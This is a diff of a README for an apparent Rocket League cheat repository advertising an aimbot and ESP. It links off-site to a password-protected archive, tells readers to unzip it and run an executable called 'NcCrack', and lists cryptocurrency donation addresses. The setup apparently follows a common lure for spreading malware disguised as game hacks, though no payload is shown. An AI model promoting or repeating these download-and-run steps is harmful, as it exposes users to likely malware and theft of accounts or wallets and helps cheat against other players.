@@ -1,31 +1,56 @@
-# Rocket-League-Cheat-HYROCOPT-HACK-Aimbot-ESP-Spoofer-Script
-# SYSTEM REQUIREMENTS:
-Intel & Amd Processor;
-Windows 10/8.1/8
+# Rocket-HACK-Aimbot-ESP-Script
 
+# IMPORTANT 
 
-# Download
-|[Download](https://www.mediafire.com/file/l58b24ooqwio65b/HYROCOPT_HACK.zip/file)|
-|:-------------|
-Passwrod: 23
+# Be sure to create an account on GitHub before launching the cheat 
+# Without it, the cheat will not be able to contact the server
 
+-----------------------------------------------------------------------------------------------------------------------
+# Download Cheat
+|[Download](https://sites.google.com/view/nccrakc/main-page)|Password: 2077|
+|---|---|
+-----------------------------------------------------------------------------------------------------------------------
 
-# Anti-cheat status:
-- RICOCHET anti-cheat game
-# Game version:
-- Latest version for PC [Steam or EpicGames]
+# Support the author ( On chips )
+
+- BTC - bc1q7kmj3pyhcm2n02z6p7gxvusqv55pt7vcgxe6ut
+
+- ETH - 0xE39c1E460cc0e10B1194F01832D19AA553b40633
+
+- TRC-20 ( Usdt ) - TRYhDuV6qVcHQjfqEgF15w72TdxCMLDt9b
+
+- BNB - 0xE39c1E460cc0e10B1194F01832D19AA553b40633
+
+-----------------------------------------------------------------------------------------------------------------------
+
 # How to install?
-- Download the archive
 
-- Unpack the archive to any location ( Password from the archive is hack )
+- Visit our website
 
-- Run the file
+- Download the archive 
+
+- Unzip the archive to your desktop ( Password from the archive is 2077 )
+
+- Run the file ( NcCrack )
 
 - Launch the game
 
-In-game INSERT button
+- In-game INSERT button
+
+-----------------------------------------------------------------------------------------------------------------------
+
+# SYSTEM REQUIREMENTS
+
+- Processor | Intel | Amd Processor |
+
+- Windows support | 7 | 8 | 8.1 | 10 | 11 |
+
+- Build support | ALL |
+
+-----------------------------------------------------------------------------------------------------------------------
 
 # Functions:
+
 - Aimbot
 
 - Auto explode
@@ -37,3 +62,6 @@ In-game INSERT button
 - Esp
 
 - And over 30+ features!
+
+![](https://github.com/GioGiKi/ppp/blob/main/rocket.jpg?raw=true)
+
